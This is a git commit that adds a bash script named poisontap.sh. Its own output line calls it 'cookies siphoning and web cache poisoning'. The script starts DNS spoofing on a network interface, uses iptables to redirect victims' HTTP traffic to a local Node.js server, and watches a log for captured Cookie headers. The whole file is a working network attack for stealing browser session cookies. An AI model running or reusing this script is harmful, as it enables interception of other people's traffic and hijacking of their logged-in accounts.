99257e25e4d16a47cb65e669f4078193596ceed2
soupbone89 <217927327+soupbone89@users.noreply.github.com>
2026-04-25 16:05:38 +0300

    Create poisontap.sh

---
+++ on_network/poisontap.sh
@@ -0,0 +1,26 @@
+#!/bin/bash
+
+echo '[*] running cookies siphoning and web cache poisoning'
+
+sleep 5 # after captive portal checks
+
+[[ $(pgrep dnsspoof) = '' ]] && {
+	#screen -dms dnsspoof dnsspoof -i "$1" port 53
+	dnsspoof -i "$1" port 53 &
+}
+
+[[ $(iptables -t nat -vnL PREROUTING | grep "$1" | grep 1337) = '' ]] && {
+	iptables -t nat -A PREROUTING -i "$1" -p tcp --dport 80 -j REDIRECT --to-port 1337
+}
+
+[[ $(pgrep -f pi_poisontap.js) = '' ]] && {
+	truncate -s 1 /opt/poisontap/poisontap.cookies.log
+	nodejs /opt/poisontap/pi_poisontap.js &
+}
+
+tail -f /opt/poisontap/poisontap.cookies.log | while read line
+do
+	if echo $line | grep 'Cookie:' --color=auto; then
+		led yellow on 2> /dev/null
+	fi
+done
